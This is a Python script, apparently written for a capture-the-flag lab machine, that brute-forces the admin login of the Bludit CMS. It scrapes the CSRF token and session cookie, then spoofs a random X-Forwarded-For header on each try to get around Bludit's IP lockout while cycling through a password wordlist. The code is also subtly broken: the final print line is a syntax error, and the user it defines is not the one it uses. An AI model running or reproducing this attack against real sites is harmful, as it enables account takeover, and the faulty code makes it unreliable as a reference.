import requests
import re
import random

host = '10.10.10.191'
user = 'fergus'
PROXY = {'http':'http://127.0.0.1:8080'}
wordlist = 'blunderwordlist.txt'

def init_session():
	#This function shall return the CSRF token found on webapge + a session cookie
	r = requests.get(f'http://{host}/admin/')
	csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"',r.text)
	#value = ([a-f0-9]*) is a regex. r.text because its a text that we are searching for in the page.

	csrf = csrf.group(1)
	
	#Next thing to do : grab cookie
	#.get to search for that particular cookie.
	cookie = r.cookies.get('BLUDIT-KEY')
	
	return csrf,cookie


def login(user,password):
	csrf,cookie=init_session()

	#changing the X-Forwarded-For header to be random, so that it won't block us via IP address 
	headers = {
		'X-Forwarded-For':f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
	}
	
	#Interceptign a login request in burp to get the fields in the login form
	#tokenCSRF=f87dbe1a1a12a76b8ddb02e8ad286ca6691ed720&username=fergus&password=fergus&save=

	data = {
		'tokenCSRF':csrf,
		'username':user,
		'password':password,
		'save':''
	}

	cookies={
		'BLUDIT-KEY':cookie
	}

	r = requests.post(f'http://{host}/admin//login',data=data,cookies=cookies,allow_redirects=False,headers=headers)

	if r.status_code != 200:
		print(f"{user}:{password}")
		print("CSRF token error or Success!!!!")
		exit()

	elif "password incorrect" in r.text:
		return False

	elif "has been blocked" in r.text:
		print("IP has been blocked")
		return False

	else:
		print(f"{user}:{password}")
		return True


#getting the wordlist + bruteforcing

wordz = open(f'{wordlist}').readlines()
attempt=0
for line in wordz:
	line=line.strip()
	login('admin',line)
	attempt += 1
	print('[+] Trying ' + line "...")


